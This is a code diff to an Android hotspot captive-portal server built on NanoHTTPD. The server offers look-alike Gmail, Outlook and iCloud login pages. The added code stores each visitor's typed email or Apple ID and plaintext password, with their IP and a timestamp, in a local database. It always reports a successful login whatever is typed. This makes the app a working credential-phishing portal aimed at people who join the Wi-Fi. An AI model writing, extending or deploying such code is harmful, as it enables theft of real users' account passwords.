@@ -1,23 +1,26 @@
 package com.example.hotspotloginapp
 
+import android.content.ContentValues
 import android.content.Context
-import android.util.Log // Ensure Log is imported
+import android.util.Log
 import fi.iki.elonen.NanoHTTPD
 import java.io.IOException
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class AppNanoHttpd(
     private val context: Context,
     port: Int,
-    private val authCallback: AuthCallback? // Kept nullable as per previous version
+    private val authCallback: AuthCallback?
 ) : NanoHTTPD(port) {
 
-    private val TAG = "AppNanoHttpd" // Added TAG for logging consistency
+    private val TAG = "AppNanoHttpd"
 
     interface AuthCallback {
         fun onAuthSuccess()
     }
 
-    // Helper to read assets
     private fun readAsset(filename: String): String? {
         return try {
             Log.d(TAG, "Reading asset: $filename")
@@ -30,6 +33,7 @@ class AppNanoHttpd(
 
     override fun serve(session: IHTTPSession): Response {
         Log.d(TAG, "Serve request: Uri = ${session.uri}, Method = ${session.method}")
+        val clientIp = session.remoteIpAddress ?: "Unknown IP"
 
         // Handle GET requests for mock service selection (redirects)
         if (session.method == Method.GET) {
@@ -52,7 +56,7 @@ class AppNanoHttpd(
         // Handle GET requests for serving HTML pages (main login and mock logins)
         if (session.method == Method.GET) {
             val pageToServe = when (session.uri) {
-                "/", "/login.html", "/index.html" -> "login.html" // Added /index.html as common alias for /
+                "/", "/login.html", "/index.html" -> "login.html"
                 "/mock_gmail_login.html" -> "mock_gmail_login.html"
                 "/mock_outlook_login.html" -> "mock_outlook_login.html"
                 "/mock_icloud_login.html" -> "mock_icloud_login.html"
@@ -70,12 +74,11 @@ class AppNanoHttpd(
             }
         }
 
-        // Handle POST requests (simple password login and mock logins)
+        // Handle POST requests
         if (session.method == Method.POST) {
-            // val params = mutableMapOf<String, String>() // Not needed if directly using session.parms
-            val files = mutableMapOf<String, String>() // Needed for parseBody for file uploads, but also for general body parsing
+            val files = mutableMapOf<String, String>()
             try {
-                session.parseBody(files) // This populates session.parms for x-www-form-urlencoded
+                session.parseBody(files) // Populates session.parms for x-www-form-urlencoded
             } catch (e: IOException) {
                 Log.e(TAG, "IOException parsing POST body", e)
                 return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, "SERVER INTERNAL ERROR: IOException: " + e.message)
@@ -84,31 +87,109 @@ class AppNanoHttpd(
                 return newFixedLengthResponse(e.status, MIME_PLAINTEXT, e.message)
             }
 
+            val dbHelper = UserLogDbHelper(context)
+            val db = dbHelper.writableDatabase
+            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+
             when (session.uri) {
-                "/login" -> { // Original simple password login
+                "/login" -> {
                     val submittedPassword = session.parms["password"]
                     Log.d(TAG, "Password login attempt. Submitted: '$submittedPassword'")
-
-                    if (submittedPassword == "password123") { // Hardcoded password
+                    // Not logging simple password to DB as per specific instructions for mock logins
+                    if (submittedPassword == "password123") {
                         Log.i(TAG, "Simple password login successful.")
                         authCallback?.onAuthSuccess()
+                        db.close()
                         return newFixedLengthResponse(Response.Status.OK, MIME_HTML, "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>body{font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body><h2>Login Successful!</h2><p>You can now access the internet.</p></body></html>")
                     } else {
                         Log.w(TAG, "Simple password login failed.")
+                        db.close()
                         return newFixedLengthResponse(Response.Status.UNAUTHORIZED, MIME_HTML, "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>body{font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body><h2>Login Failed!</h2><p><a href='/'>Try again</a></p></body></html>")
                     }
                 }
                 "/login/mockgmail" -> {
+                    val typedEmail = session.parms["email"] ?: "N/A"
+                    val typedPassword = session.parms["password"] ?: "N/A"
+                    val mockService = "Gmail"
+
+                    val values = ContentValues().apply {
+                        put(UserLogContract.LogEntry.COLUMN_NAME_TIMESTAMP, timestamp)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_DEVICE_IDENTIFIER, clientIp)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_MOCK_SERVICE, mockService)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_TYPED_EMAIL, typedEmail)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_TYPED_PASSWORD, typedPassword)
+                    }
+                    try {
+                        val newRowId = db.insert(UserLogContract.LogEntry.TABLE_NAME, null, values)
+                        if (newRowId != -1L) {
+                            Log.d(TAG, "Saved MockGmail login: email='$typedEmail' from $clientIp (Row ID: $newRowId)")
+                        } else {
+                            Log.e(TAG, "Error saving MockGmail login for $clientIp")
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Database insert error for MockGmail: ${e.message}", e)
+                    } finally {
+                        db.close()
+                    }
+
                     Log.i(TAG, "MockGmail login attempt processed as success.")
                     authCallback?.onAuthSuccess()
                     return newFixedLengthResponse(Response.Status.OK, MIME_HTML, "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>body{font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body><h2>MockGmail Login Successful!</h2><p>You can now access the internet.</p></body></html>")
                 }
                 "/login/mockoutlook" -> {
+                    val typedEmail = session.parms["email"] ?: "N/A"
+                    val typedPassword = session.parms["password"] ?: "N/A"
+                    val mockService = "Outlook"
+
+                    val values = ContentValues().apply {
+                        put(UserLogContract.LogEntry.COLUMN_NAME_TIMESTAMP, timestamp)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_DEVICE_IDENTIFIER, clientIp)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_MOCK_SERVICE, mockService)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_TYPED_EMAIL, typedEmail)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_TYPED_PASSWORD, typedPassword)
+                    }
+                    try {
+                        val newRowId = db.insert(UserLogContract.LogEntry.TABLE_NAME, null, values)
+                        if (newRowId != -1L) {
+                            Log.d(TAG, "Saved MockOutlook login: email='$typedEmail' from $clientIp (Row ID: $newRowId)")
+                        } else {
+                            Log.e(TAG, "Error saving MockOutlook login for $clientIp")
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Database insert error for MockOutlook: ${e.message}", e)
+                    } finally {
+                        db.close()
+                    }
+
                     Log.i(TAG, "MockOutlook login attempt processed as success.")
                     authCallback?.onAuthSuccess()
                     return newFixedLengthResponse(Response.Status.OK, MIME_HTML, "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>body{font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body><h2>MockOutlook Login Successful!</h2><p>You can now access the internet.</p></body></html>")
                 }
                 "/login/mockicloud" -> {
+                    val typedAppleId = session.parms["apple_id"] ?: "N/A" // Using "apple_id" from form
+                    val typedPassword = session.parms["password"] ?: "N/A"
+                    val mockService = "iCloud"
+
+                    val values = ContentValues().apply {
+                        put(UserLogContract.LogEntry.COLUMN_NAME_TIMESTAMP, timestamp)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_DEVICE_IDENTIFIER, clientIp)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_MOCK_SERVICE, mockService)
+                        put(UserLogContract.LogEntry.COLUMN_NAME_TYPED_EMAIL, typedAppleId) // Storing apple_id in typed_email column
+                        put(UserLogContract.LogEntry.COLUMN_NAME_TYPED_PASSWORD, typedPassword)
+                    }
+                     try {
+                        val newRowId = db.insert(UserLogContract.LogEntry.TABLE_NAME, null, values)
+                        if (newRowId != -1L) {
+                            Log.d(TAG, "Saved MockiCloud login: apple_id='$typedAppleId' from $clientIp (Row ID: $newRowId)")
+                        } else {
+                            Log.e(TAG, "Error saving MockiCloud login for $clientIp")
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Database insert error for MockiCloud: ${e.message}", e)
+                    } finally {
+                        db.close()
+                    }
+
                     Log.i(TAG, "MockiCloud login attempt processed as success.")
                     authCallback?.onAuthSuccess()
                     return newFixedLengthResponse(Response.Status.OK, MIME_HTML, "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'><style>body{font-family:sans-serif;text-align:center;padding-top:50px;}</style></head><body><h2>MockiCloud Login Successful!</h2><p>You can now access the internet.</p></body></html>")
@@ -116,7 +197,6 @@ class AppNanoHttpd(
             }
         }
 
-        // Default response if no routes matched
         Log.d(TAG, "No matching route for Uri: ${session.uri}, Method: ${session.method}")
         return newFixedLengthResponse(Response.Status.NOT_FOUND, MIME_PLAINTEXT, "Not Found")
     }
